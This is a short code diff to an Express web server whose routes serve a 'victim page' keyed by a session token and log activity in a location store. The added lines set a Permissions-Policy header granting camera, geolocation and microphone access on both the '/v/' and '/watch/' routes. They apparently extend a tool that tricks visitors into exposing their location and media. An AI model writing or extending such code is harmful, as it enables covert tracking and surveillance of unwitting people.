@@ -425,6 +425,7 @@ router.get('/v/:sessionToken', (req, res) => {
     _locStore[sessionToken].timestamp  = Date.now();
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
     res.send(renderVictimPage(sessionToken));
 });
 
@@ -442,6 +443,7 @@ router.get('/watch/:sessionToken', (req, res) => {
     _locStore[sessionToken].timestamp  = Date.now();
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
     res.send(renderVictimPage(sessionToken));
 });
 
